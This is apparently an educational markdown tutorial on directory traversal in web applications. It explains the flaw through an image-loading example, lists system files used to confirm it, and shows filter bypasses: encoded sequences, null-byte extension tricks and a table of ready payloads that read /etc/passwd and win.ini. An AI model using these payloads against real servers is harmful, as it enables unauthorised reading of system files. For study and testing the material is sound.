
# Directory Travarsal

## What is directory traversal?

Directory traversal (also known as file path traversal or Local file Inclusion) is a web security vulnerability in which attacker can read arbitrary files from the server that includes the source code file of the application. Sometimes attackers are able to write to some arbitrary files that could lead to full remote code execution on the server.

**Senario**

Consider an application that shows the image file and the image is loaded via HTML like the following.

```html
<img src="/loadImage?filename=218.png">
```

In the above code, they request the web API endpoint in which they load the file. They should look like the following in URL form.

```
http://example.com/loadImage?filename=218.png
```

The image is loaded from some hard-coded path in the web root and in that case they are following.

```
/var/www/html/images/218.png
```

If the application doesn't secure it properly it could lead to arbitrary file reading. instead of giving the image file name we can give him `../../../etc/passwd` and if they give us the context of `/etc/passwd` they are vulnerable to path traversal attack. The `../` sequence is used to go back to one directory so by going back multiple times we come to the file root and then specify the `/etc/passwd` file. we can also simply just add multiple `../` sequences because we cannot go further back after hitting the root file system.

One thing we should know is which OS application is running and we have to specify the files that are present there like on unix os `/etc/passwd` file always exits that have all the user information in the system but for windows, we have other files that are readable to everyone and that could be used to detect directory traversal.

Following are some common files that are readable and may be used to detect it.
| Unix | Windows |
| --- | --- |
| `/etc/passwd` | `/windows/boot.ini` |
| `/etc/group` | `/autoexec.bat` |
| `/etc/hosts` | `/windows/system.ini` |
| `/proc/self/environ` | `/windows/win.ini` |

> **Note:** One windows both `..\` and `../` are valid directory traversal sequences.

## Obstacles in exploitation

Some applications implement some hardening for path traversal attacks that includes striping or blocking the directory traversal sequences from user-supplied filenames. This kind of protection often bypasses by just using an absolute path i.e `/etc/passwd`. If that does not help then single or double URL encoding the directory traversal sequences may bypass the protection for example the payload `../../etc/passwd` after url encoded may look like this `%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`. Sometimes non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f` may also do the trick.

if the application tries to validate the user-supplied filename must start with some expected location i.e `/var/www/images` then we can add that and after then use directory traversal sequences to go back i.e `filename=/var/www/images/../../../../etc/passwd`.

If the application validates that the extension must be an image file like `.png` then in some backend languages, it is possible to use a Null byte to terminate the extension checking requirement for example.

```
filename=../../../../../etc/passwd%00.png
```

## Common Payloads

| Unix | Windows |
| --- | --- |
| `/etc/passwd` | `/Windows/win.ini` |
| `../../../../../../etc/passwd` | `../../../../../../Windows/win.ini` |
| `....//....//....//....//....//....//etc/passwd` | `....//....//....//....//....//....//Windows/win.ini` |
| `%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2Fetc%2Fpasswd` | `%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2FWindows%2Fwin%2Eini` |
| `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd` | `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FWindows%2Fwin%2Eini` |
| `%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd` | `%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252FWindows%252Fwin%252Eini` |

---
